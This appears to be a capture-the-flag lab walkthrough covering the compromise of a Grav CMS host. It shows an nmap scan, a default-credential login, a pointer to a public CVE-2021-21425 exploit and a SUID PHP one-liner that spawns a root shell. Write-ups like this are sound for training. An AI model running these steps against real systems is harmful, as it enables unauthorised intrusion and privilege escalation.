#Linux 
## Summary:

In this guide we will exploit an Unauthenticated Arbitrary YAML Write/Update in `Grav CMS` which leads to RCE to gain our initial foothold. In order to escalate privileges we will discover a vulnerable `PHP` SUID binary.

#Linux #GravCMS #suid_privesc 
## Enumeration:

We begin the enumeration process with an `nmap` scan.
```bash
┌──(root㉿kali)-[/home/kali/ugc/gravity]
└─# nmap -p22,80 -sC -sV -oA nmap/gravity 192.168.145.160
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-17 09:04 EDT
Nmap scan report for 192.168.145.160
Host is up (0.00077s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:a9:43:8d:98:03:db:57:8c:be:9a:93:36:f9:34:13 (RSA)
|   256 70:2c:18:90:18:c0:a8:c5:7c:9b:a7:da:dc:7e:e9:32 (ECDSA)
|_  256 79:3d:a2:28:b8:dc:7b:0d:c4:53:ba:52:81:cc:ca:f8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
| http-ls: Volume 
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

From the output of our scan we see `grav-admin/` on port `80`.
Navigating to port `80` we see a default installation of `Grav CMS` and view the admin endpoint.
Navigating to `grav-admin/admin` we see the following login page.

When testing default credentials we see that we have gained access to the admin login page.
We proceed by searching for unauthenticated Grav CMS exploits and as seen below, we see a few CVEs.
One of the google results leads us to the following exploit:
Reference: https://github.com/CsEnox/CVE-2021-21425/blob/main/exploit.py
We download the exploit to our attack machine using wget.

# Privilege Escalation

We search for any interesting SUID binaries and see `/usr/bin/php7.4` in the output.
Using `https://gtfobins.github.io/`, we see an entry for PHP and follow the listed steps in order to obtain root access.

```bash
www-data@gravity:~/html/grav-admin$ php -r "pcntl_exec('/bin/sh', ['-p']);"
# whoami
root
```